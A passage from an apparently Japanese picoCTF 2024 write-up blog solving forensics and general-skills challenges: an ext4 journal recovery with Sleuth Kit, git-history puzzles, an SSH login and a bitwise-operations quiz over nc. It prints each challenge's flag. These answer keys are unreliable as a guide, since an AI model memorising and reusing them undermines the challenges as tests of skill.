class="line">Great job, you got that one!</span><br><span class="line"></span><br><span class="line">Checking tag 3/7</span><br><span class="line">Looking at ExifIFD: CreateDate</span><br><span class="line">Looking <span class="keyword">for</span> <span class="string">&#x27;1970:01:01 00:00:00&#x27;</span></span><br><span class="line">Found: 1970:01:01 00:00:00</span><br><span class="line">Great job, you got that one!</span><br><span class="line"></span><br><span class="line">Checking tag 4/7</span><br><span class="line">Looking at Composite: SubSecCreateDate</span><br><span class="line">Looking <span class="keyword">for</span> <span class="string">&#x27;1970:01:01 00:00:00.001&#x27;</span></span><br><span class="line">Found: 1970:01:01 00:00:00.001</span><br><span class="line">Great job, you got that one!</span><br><span class="line"></span><br><span class="line">Checking tag 5/7</span><br><span class="line">Looking at Composite: SubSecDateTimeOriginal</span><br><span class="line">Looking <span class="keyword">for</span> <span class="string">&#x27;1970:01:01 00:00:00.001&#x27;</span></span><br><span class="line">Found: 1970:01:01 00:00:00.001</span><br><span class="line">Great job, you got that one!</span><br><span class="line"></span><br><span class="line">Checking tag 6/7</span><br><span class="line">Looking at Composite: SubSecModifyDate</span><br><span class="line">Looking <span class="keyword">for</span> <span class="string">&#x27;1970:01:01 00:00:00.001&#x27;</span></span><br><span class="line">Found: 1970:01:01 00:00:00.001</span><br><span class="line">Great job, you got that one!</span><br><span class="line"></span><br><span class="line">Checking tag 7/7</span><br><span class="line">Timezones <span class="keyword">do</span> not have to match, as long as it<span class="string">&#x27;s the equivalent time.</span></span><br><span class="line"><span class="string">Looking at Samsung: TimeStamp</span></span><br><span class="line"><span class="string">Looking for &#x27;</span>1970:01:01 00:00:00.001+00:00<span class="string">&#x27;</span></span><br><span class="line"><span class="string">Found: 1970:01:01 00:00:00.001+00:00</span></span><br><span class="line"><span class="string">Great job! You got that one!</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">You did it!</span></span><br><span class="line"><span class="string">picoCTF&#123;71m3_7r4v311ng_p1c7ur3_ed953b57&#125;</span></span><br></pre></td></tr></table></figure>

<aside style="padding: 10px; border-radius: 5px; border: 1px solid #eee; background-color: transparent; width: 800px;">
⛳ picoCTF{71m3_7r4v311ng_p1c7ur3_ed953b57}

</aside>

<h3><span id="dear-diary">Dear Diary</span></h3><img src="/img/2024/03-27/Untitled%2037.png" width="550px" height="auto"> 

<p>めちゃくちゃ難しかった…</p>
<p>ext4なディスクイメージの解析だが、削除済みファイル含めて特に怪しいものはない。</p>
<p><code>/root/</code> 以下は</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">% fls -rp -o 0001140736  disk.flag.img 204</span><br><span class="line">r/r 1837:       .ash_history</span><br><span class="line">d/d 1842:       secret-secrets</span><br><span class="line">r/r 1843:       secret-secrets/force-wait.sh</span><br><span class="line">r/r 1844:       secret-secrets/innocuous-file.txt</span><br><span class="line">r/r 1845:       secret-secrets/its-all-in-the-name</span><br></pre></td></tr></table></figure>

<p>といった感じで意味深だが…</p>
<hr>
<p>試行錯誤を経て編集前のファイルが見たくなり、ext4ってジャーナルあったよな？と思いを馳せる。</p>
<p><a target="_blank" rel="noopener" href="https://qiita.com/rarul/items/1cdd5e7dc5b436dc2b3c#jdb2">https://qiita.com/rarul/items/1cdd5e7dc5b436dc2b3c#jdb2</a> によると、inode 8番がジャーナルらしい。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">icat -o 0001140736  disk.flag.img 8 |strings</span><br></pre></td></tr></table></figure>

<p>の結果をなんとなく眺めていると、 <code>original-filename</code> の文字列を見つける。これは怪しい。</p>
<p>心の目で眺めると <code>oCT</code> や <code>F&#123;1</code> の文字列も見つかり、これですわ。どうやら <code>its-all-in-the-name</code> ファイルは、 <code>original-filename</code> からフラグ断片の名前を経てリネームされてきたよう。</p>
<p>以下コマンドからフラグの断片を集める。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line">% icat -o 0001140736  disk.flag.img 8 |xxd |grep s-file.txt -A3</span><br><span class="line">001f8840: 732d 6669 6c65 2e74 7874 0000 0000 0000  s-file.txt......</span><br><span class="line">001f8850: 0000 0000 0000 0000 0000 0000 0000 0000  ................</span><br><span class="line">001f8860: 0000 0000 0000 0000 0000 0000 0000 0000  ................</span><br><span class="line">001f8870: 0000 0000 0000 0000 0000 0000 0000 0000  ................</span><br><span class="line">--</span><br><span class="line">001fbc40: 732d 6669 6c65 2e74 7874 0000 3507 0000  s-file.txt..5...</span><br><span class="line">001fbc50: a803 1101 6f72 6967 696e 616c 2d66 696c  ....original-fil</span><br><span class="line">001fbc60: 656e 616d 6500 0000 0000 0000 0000 0000  ename...........</span><br><span class="line">001fbc70: 0000 0000 0000 0000 0000 0000 0000 0000  ................</span><br><span class="line">--</span><br><span class="line">001fdc40: 732d 6669 6c65 2e74 7874 0000 0000 0000  s-file.txt......</span><br><span class="line">001fdc50: 0000 0000 0000 0000 0000 0000 0000 0000  ................</span><br><span class="line">001fdc60: 0000 0000 0000 0000 3507 0000 8c03 0301  ........5.......</span><br><span class="line">001fdc70: 7069 6300 0000 0000 0000 0000 0000 0000  pic.............</span><br><span class="line">--</span><br><span class="line">001ff440: 732d 6669 6c65 2e74 7874 0000 3507 0000  s-file.txt..5...</span><br><span class="line">001ff450: a803 0301 6f43 5400 0000 0000 0000 0000  ....oCT.........</span><br><span class="line">001ff460: 0000 0000 0000 0000 0000 0000 0000 0000  ................</span><br><span class="line">001ff470: 0000 0000 0000 0000 0000 0000 0000 0000  ................</span><br><span class="line">--</span><br><span class="line">00201840: 732d 6669 6c65 2e74 7874 0000 0000 0000  s-file.txt......</span><br><span class="line">00201850: 0000 0000 0000 0000 3507 0000 9c03 0301  ........5.......</span><br><span class="line">00201860: 467b 3100 0000 0000 0000 0000 0000 0000  F&#123;1.............</span><br><span class="line">00201870: 0000 0000 0000 0000 0000 0000 0000 0000  ................</span><br><span class="line">--</span><br><span class="line">00203c40: 732d 6669 6c65 2e74 7874 0000 3507 0000  s-file.txt..5...</span><br><span class="line">00203c50: a803 0301 5f35 3300 0000 0000 0000 0000  ...._53.........</span><br><span class="line">00203c60: 0000 0000 0000 0000 0000 0000 0000 0000  ................</span><br><span class="line">00203c70: 0000 0000 0000 0000 0000 0000 0000 0000  ................</span><br><span class="line">--</span><br><span class="line">00206040: 732d 6669 6c65 2e74 7874 0000 0000 0000  s-file.txt......</span><br><span class="line">00206050: 0000 0000 0000 0000 3507 0000 9c03 0301  ........5.......</span><br><span class="line">00206060: 335f 6e00 0000 0000 0000 0000 0000 0000  3_n.............</span><br><span class="line">00206070: 0000 0000 0000 0000 0000 0000 0000 0000  ................</span><br><span class="line">--</span><br><span class="line">00207840: 732d 6669 6c65 2e74 7874 0000 3507 0000  s-file.txt..5...</span><br><span class="line">00207850: a803 0301 346d 3300 0000 0000 0000 0000  ....4m3.........</span><br><span class="line">00207860: 0000 0000 0000 0000 0000 0000 0000 0000  ................</span><br><span class="line">00207870: 0000 0000 0000 0000 0000 0000 0000 0000  ................</span><br><span class="line">--</span><br><span class="line">00209c40: 732d 6669 6c65 2e74 7874 0000 0000 0000  s-file.txt......</span><br><span class="line">00209c50: 0000 0000 0000 0000 3507 0000 9c03 0301  ........5.......</span><br><span class="line">00209c60: 355f 3800 0000 0000 0000 0000 0000 0000  5_8.............</span><br><span class="line">00209c70: 0000 0000 0000 0000 0000 0000 0000 0000  ................</span><br><span class="line">--</span><br><span class="line">0020b440: 732d 6669 6c65 2e74 7874 0000 3507 0000  s-file.txt..5...</span><br><span class="line">0020b450: a803 0301 3064 3200 0000 0000 0000 0000  ....0d2.........</span><br><span class="line">0020b460: 0000 0000 0000 0000 0000 0000 0000 0000  ................</span><br><span class="line">0020b470: 0000 0000 0000 0000 0000 0000 0000 0000  ................</span><br><span class="line">--</span><br><span class="line">0020d840: 732d 6669 6c65 2e74 7874 0000 0000 0000  s-file.txt......</span><br><span class="line">0020d850: 0000 0000 0000 0000 3507 0000 9c03 0301  ........5.......</span><br><span class="line">0020d860: 3462 3300 0000 0000 0000 0000 0000 0000  4b3.............</span><br><span class="line">0020d870: 0000 0000 0000 0000 0000 0000 0000 0000  ................</span><br><span class="line">--</span><br><span class="line">0020fc40: 732d 6669 6c65 2e74 7874 0000 3507 0000  s-file.txt..5...</span><br><span class="line">0020fc50: a803 0201 307d 0000 0000 0000 0000 0000  ....0&#125;..........</span><br><span class="line">0020fc60: 0000 0000 0000 0000 0000 0000 0000 0000  ................</span><br><span class="line">0020fc70: 0000 0000 0000 0000 0000 0000 0000 0000  ................</span><br><span class="line">--</span><br><span class="line">00211440: 732d 6669 6c65 2e74 7874 0000 0000 0000  s-file.txt......</span><br><span class="line">00211450: 0000 0000 0000 0000 3507 0000 9c03 1301  ........5.......</span><br><span class="line">00211460: 6974 732d 616c 6c2d 696e 2d74 6865 2d6e  its-all-in-the-n</span><br><span class="line">00211470: 616d 6500 0000 0000 0000 0000 0000 0000  ame.............</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">001ff400: <span class="number">3207</span> <span class="number">0000</span> 0c00 <span class="number">0</span>102 <span class="number">2e00</span> <span class="number">0000</span> cc00 <span class="number">0000</span>  <span class="number">2.</span>..............</span><br><span class="line">001ff410: 0c00 0202 2e2e <span class="number">0000</span> <span class="number">3307</span> <span class="number">0000</span> <span class="number">1800</span> 0d01  .......<span class="number">.3</span>.......</span><br><span class="line">001ff420: 666f <span class="number">7263</span> 652d <span class="number">7761</span> <span class="number">6974</span> <span class="number">2e73</span> <span class="number">6800</span> <span class="number">0000</span>  force-wait.sh...</span><br><span class="line">001ff430: <span class="number">3407</span> <span class="number">0000</span> 1c00 <span class="number">1201</span> 696e 6e6f <span class="number">6375</span> 6f75  <span class="number">4.</span>......innocuou</span><br><span class="line">001ff440: 732d <span class="number">6669</span> 6c65 <span class="number">2e74</span> <span class="number">7874</span> <span class="number">0000</span> <span class="number">3507</span> <span class="number">0000</span>  s-file.txt.<span class="number">.5</span>...</span><br><span class="line">001ff450: a803 0301 6f43 <span class="number">5400</span> <span class="number">0000</span> <span class="number">0000</span> <span class="number">0000</span> <span class="number">0000</span>  ....oCT.........</span><br><span class="line">001ff460: <span class="number">0000</span> <span class="number">0000</span> <span class="number">0000</span> <span class="number">0000</span> <span class="number">0000</span> <span class="number">0000</span> <span class="number">0000</span> <span class="number">0000</span>  ................</span><br></pre></td></tr></table></figure>

<aside style="padding: 10px; border-radius: 5px; border: 1px solid #eee; background-color: transparent; width: 800px;">
⛳ picoCTF{1_533_n4m35_80d24b30}

</aside>

<h2><span id="general-skills">General Skills</span></h2><h3><span id="super-ssh">Super SSH</span></h3><img src="/img/2024/03-27/Untitled%2038.png" width="550px" height="auto"> 

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">% ssh ctf-player@titan.picoctf.net -p <span class="number">65080</span></span><br><span class="line">Warning: Permanently added <span class="string">&#x27;[titan.picoctf.net]:65080&#x27;</span> (ED25519) to the <span class="built_in">list</span> of known hosts.</span><br><span class="line">ctf-player@titan.picoctf.net<span class="string">&#x27;s password:</span></span><br><span class="line"><span class="string">bash: warning: setlocale: LC_ALL: cannot change locale (en_US.UTF-8)</span></span><br><span class="line"><span class="string">bash: warning: setlocale: LC_ALL: cannot change locale (en_US.UTF-8)</span></span><br><span class="line"><span class="string">Welcome ctf-player, here&#x27;</span>s your flag: picoCTF&#123;s3cur3_c0nn3ct10n_5d09a462&#125;</span><br><span class="line">Connection to titan.picoctf.net closed.</span><br></pre></td></tr></table></figure>

<aside style="padding: 10px; border-radius: 5px; border: 1px solid #eee; background-color: transparent; width: 800px;">
⛳ picoCTF{s3cur3_c0nn3ct10n_5d09a462}

</aside>

<h3><span id="commitment-issues">Commitment Issues</span></h3><img src="/img/2024/03-27/Untitled%2039.png" width="550px" height="auto"> 

<p>gitのlog見る。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">% unzip challenge.zip</span><br><span class="line">% <span class="built_in">cd</span> drop-in</span><br><span class="line">% <span class="built_in">cat</span> message.txt</span><br><span class="line">TOP SECRET</span><br><span class="line">% git <span class="built_in">log</span> -p</span><br></pre></td></tr></table></figure>

<figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">commit e1237df82d2e69f62dd53279abc1c8aeb66f6d64 (HEAD -&gt; master)</span><br><span class="line">Author: picoCTF &lt;ops@picoctf.com&gt;</span><br><span class="line">Date:   Sat Mar 9 21:10:14 2024 +0000</span><br><span class="line"></span><br><span class="line">    remove sensitive info</span><br><span class="line"></span><br><span class="line"><span class="comment">diff --git a/message.txt b/message.txt</span></span><br><span class="line"><span class="comment">index 96f7309..d552d1e 100644</span></span><br><span class="line"><span class="comment">--- a/message.txt</span></span><br><span class="line"><span class="comment">+++ b/message.txt</span></span><br><span class="line">@@ -1 +1 @@</span><br><span class="line"><span class="deletion">-picoCTF&#123;s@n1t1z3_30e86d36&#125;</span></span><br><span class="line"><span class="addition">+TOP SECRET</span></span><br><span class="line"></span><br><span class="line">commit 3d5ec8a26ee7b092a1760fea18f384c35e435139</span><br><span class="line">Author: picoCTF &lt;ops@picoctf.com&gt;</span><br><span class="line">Date:   Sat Mar 9 21:10:14 2024 +0000</span><br><span class="line"></span><br><span class="line">    create flag</span><br><span class="line"></span><br><span class="line"><span class="comment">diff --git a/message.txt b/message.txt</span></span><br><span class="line">new file mode 100644</span><br><span class="line"><span class="comment">index 0000000..96f7309</span></span><br><span class="line"><span class="comment">--- /dev/null</span></span><br><span class="line"><span class="comment">+++ b/message.txt</span></span><br><span class="line">@@ -0,0 +1 @@</span><br><span class="line"><span class="addition">+picoCTF&#123;s@n1t1z3_30e86d36&#125;</span></span><br></pre></td></tr></table></figure>

<aside style="padding: 10px; border-radius: 5px; border: 1px solid #eee; background-color: transparent; width: 800px;">
⛳ picoCTF{s@n1t1z3_30e86d36}

</aside>

<h3><span id="time-machine">Time Machine</span></h3><img src="/img/2024/03-27/Untitled%2040.png" width="550px" height="auto"> 

<p>Commitment Issues に続きまたgit問題。 <code>git log -p</code> したらコミットメッセージにフラグ。</p>
<figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">commit 705ff639b7846418603a3272ab54536e01e3dc43 (HEAD -&gt; master)</span><br><span class="line">Author: picoCTF &lt;ops@picoctf.com&gt;</span><br><span class="line">Date:   Sat Mar 9 21:10:36 2024 +0000</span><br><span class="line"></span><br><span class="line">    picoCTF&#123;t1m3m@ch1n3_b476ca06&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">diff --git a/message.txt b/message.txt</span></span><br><span class="line">new file mode 100644</span><br><span class="line"><span class="comment">index 0000000..4324621</span></span><br><span class="line"><span class="comment">--- /dev/null</span></span><br><span class="line"><span class="comment">+++ b/message.txt</span></span><br><span class="line">@@ -0,0 +1 @@</span><br><span class="line"><span class="addition">+This is what I was working on, but I&#x27;d need to look at my commit history to know why...</span></span><br><span class="line">\ No newline at end of file</span><br></pre></td></tr></table></figure>

<aside style="padding: 10px; border-radius: 5px; border: 1px solid #eee; background-color: transparent; width: 800px;">
⛳ picoCTF{t1m3m@ch1n3_b476ca06}

</aside>

<h3><span id="blame-game">Blame Game</span></h3><img src="/img/2024/03-27/Untitled%2041.png" width="550px" height="auto"> 

<p>添付の中には不完全な .py 。</p>
<p>（タイトル通りgit blameしても良いが）git log -p で一番下の方のコミットログにフラグ。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">% git <span class="built_in">log</span> -p</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">commit 0fe87f16cbd8129ed5f7cf2f6a06af6688665728</span><br><span class="line">Author: picoCTF&#123;@sk_th3_1nt3rn_ea346835&#125; &lt;ops@picoctf.com&gt;</span><br><span class="line">Date:   Sat Mar 9 21:09:25 2024 +0000</span><br><span class="line"></span><br><span class="line">    optimize file size of prod code</span><br><span class="line"></span><br><span class="line">diff --git a/message.py b/message.py</span><br><span class="line">index 7df869a..326544a 100644</span><br><span class="line">--- a/message.py</span><br><span class="line">+++ b/message.py</span><br><span class="line">@@ -1 +1 @@</span><br><span class="line">-<span class="built_in">print</span>(<span class="string">&quot;Hello, World!&quot;</span>)</span><br><span class="line">+<span class="built_in">print</span>(<span class="string">&quot;Hello, World!&quot;</span></span><br></pre></td></tr></table></figure>

<aside style="padding: 10px; border-radius: 5px; border: 1px solid #eee; background-color: transparent; width: 800px;">
⛳ picoCTF{@sk_th3_1nt3rn_ea346835}

</aside>

<h3><span id="collaborative-development">Collaborative Development</span></h3><img src="/img/2024/03-27/Untitled%2042.png" width="550px" height="auto"> 

<p>ブランチがいくつかあるので一気通貫でログを見る。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line">% git <span class="built_in">log</span> -p --branches=<span class="string">&#x27;*&#x27;</span></span><br><span class="line"></span><br><span class="line">commit 74ae5215b93a82ddf3dd37df3d4c6b5aff0a93ed (feature/part-1)</span><br><span class="line">Author: picoCTF &lt;ops@picoctf.com&gt;</span><br><span class="line">Date:   Sat Mar 9 21:09:51 2024 +0000</span><br><span class="line"></span><br><span class="line">    add part 1</span><br><span class="line"></span><br><span class="line">diff --git a/flag.py b/flag.py</span><br><span class="line">index 77d6cec..6e17fb3 100644</span><br><span class="line">--- a/flag.py</span><br><span class="line">+++ b/flag.py</span><br><span class="line">@@ -1 +1,2 @@</span><br><span class="line"> <span class="built_in">print</span>(<span class="string">&quot;Printing the flag...&quot;</span>)</span><br><span class="line">+<span class="built_in">print</span>(<span class="string">&quot;picoCTF&#123;t3@mw0rk_&quot;</span>, end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">\ No newline at end of file</span><br><span class="line"></span><br><span class="line">commit b4612c914d8461d1b1a50652cc303b76813ee142 (feature/part-2)</span><br><span class="line">Author: picoCTF &lt;ops@picoctf.com&gt;</span><br><span class="line">Date:   Sat Mar 9 21:09:51 2024 +0000</span><br><span class="line"></span><br><span class="line">    add part 2</span><br><span class="line"></span><br><span class="line">diff --git a/flag.py b/flag.py</span><br><span class="line">index 77d6cec..7ab4e25 100644</span><br><span class="line">--- a/flag.py</span><br><span class="line">+++ b/flag.py</span><br><span class="line">@@ -1 +1,3 @@</span><br><span class="line"> <span class="built_in">print</span>(<span class="string">&quot;Printing the flag...&quot;</span>)</span><br><span class="line">+</span><br><span class="line">+<span class="built_in">print</span>(<span class="string">&quot;m@k3s_th3_dr3@m_&quot;</span>, end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">\ No newline at end of file</span><br><span class="line"></span><br><span class="line">commit 5c6d493ac583a95117d3a70eb5b10d9d76991c48 (feature/part-3)</span><br><span class="line">Author: picoCTF &lt;ops@picoctf.com&gt;</span><br><span class="line">Date:   Sat Mar 9 21:09:51 2024 +0000</span><br><span class="line"></span><br><span class="line">    add part 3</span><br><span class="line"></span><br><span class="line">diff --git a/flag.py b/flag.py</span><br><span class="line">index 77d6cec..59d9bf3 100644</span><br><span class="line">--- a/flag.py</span><br><span class="line">+++ b/flag.py</span><br><span class="line">@@ -1 +1,3 @@</span><br><span class="line"> <span class="built_in">print</span>(<span class="string">&quot;Printing the flag...&quot;</span>)</span><br><span class="line">+</span><br><span class="line">+<span class="built_in">print</span>(<span class="string">&quot;w0rk_4c24302f&#125;&quot;</span>)</span><br><span class="line"></span><br><span class="line">commit 6ce09adec311b859780caf89d993c58e34b53fa6 (HEAD -&gt; main)</span><br><span class="line">Author: picoCTF &lt;ops@picoctf.com&gt;</span><br><span class="line">Date:   Sat Mar 9 21:09:51 2024 +0000</span><br><span class="line"></span><br><span class="line">    init flag printer</span><br><span class="line"></span><br><span class="line">diff --git a/flag.py b/flag.py</span><br><span class="line">new file mode 100644</span><br><span class="line">index 0000000..77d6cec</span><br><span class="line">--- /dev/null</span><br><span class="line">+++ b/flag.py</span><br><span class="line">@@ -0,0 +1 @@</span><br><span class="line">+<span class="built_in">print</span>(<span class="string">&quot;Printing the flag...&quot;</span>)</span><br></pre></td></tr></table></figure>

<aside style="padding: 10px; border-radius: 5px; border: 1px solid #eee; background-color: transparent; width: 800px;">
⛳ picoCTF{t3@mw0rk_m@k3s_th3_dr3@m_w0rk_4c24302f}

</aside>

<h3><span id="binhexa">binhexa</span></h3><img src="/img/2024/03-27/Untitled%2043.png" width="550px" height="auto"> 

<p>ncで繋いで指示通りビット演算。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">% nc titan.picoctf.net 62817</span><br><span class="line"></span><br><span class="line">Welcome to the Binary Challenge!<span class="string">&quot;</span></span><br><span class="line"><span class="string">Your task is to perform the unique operations in the given order and find the final result in hexadecimal that yields the flag.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Binary Number 1: 01110110</span></span><br><span class="line"><span class="string">Binary Number 2: 00000001</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Question 1/6:</span></span><br><span class="line"><span class="string">Operation 1: &#x27;|&#x27;</span></span><br><span class="line"><span class="string">Perform the operation on Binary Number 1&amp;2.</span></span><br><span class="line"><span class="string">Enter the binary result: 01110111</span></span><br><span class="line"><span class="string">Correct!</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Question 2/6:</span></span><br><span class="line"><span class="string">Operation 2: &#x27;&lt;&lt;&#x27;</span></span><br><span class="line"><span class="string">Perform a left shift of Binary Number 1 by 1 bits.</span></span><br><span class="line"><span class="string">Enter the binary result: 11101100</span></span><br><span class="line"><span class="string">Correct!</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Question 3/6:</span></span><br><span class="line"><span class="string">Operation 3: &#x27;&amp;&#x27;</span></span><br><span class="line"><span class="string">Perform the operation on Binary Number 1&amp;2.</span></span><br><span class="line"><span class="string">Enter the binary result: 00000000</span></span><br><span class="line"><span class="string">Correct!</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Question 4/6:</span></span><br><span class="line"><span class="string">Operation 4: &#x27;&gt;&gt;&#x27;</span></span><br><span class="line"><span class="string">Perform a right shift of Binary Number 2 by 1 bits .</span></span><br><span class="line"><span class="string">Enter the binary result: 00000000</span></span><br><span class="line"><span class="string">Correct!</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Question 5/6:</span></span><br><span class="line"><span class="string">Operation 5: &#x27;*&#x27;</span></span><br><span class="line"><span class="string">Perform the operation on Binary Number 1&amp;2.</span></span><br><span class="line"><span class="string">Enter the binary result: 01110110</span></span><br><span class="line"><span class="string">Correct!</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Question 6/6:</span></span><br><span class="line"><span class="string">Operation 6: &#x27;+&#x27;</span></span><br><span class="line"><span class="string">Perform the operation on Binary Number 1&amp;2.</span></span><br><span class="line"><span class="string">Enter the binary result: 01110111</span></span><br><span class="line"><span class="string">Correct!</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Enter the results of the last operation in hexadecimal: 0x77</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Correct answer!</span></span><br><span class="line"><span class="string">The flag is: picoCTF&#123;b1tw^3se_0p3eR@tI0n_su33essFuL_aeaf4b09&#125;</span></span><br></pre></td></tr></table></figure>

<aside style="padding: 10px; border-radius: 5px; border: 1px solid #eee; background-color: transparent; width: 800px;">
⛳ picoCTF{b1tw^3se_0p3eR@tI0n_su33essFuL_aeaf4b09}

</aside>

<h3><span id="binary-search">Binary Search</span></h3><img src="/img/2024/03-27/Untitled%2044.png" width="550px" height="auto"> 

<p>sshして暗算で適当に二分探索。</p>
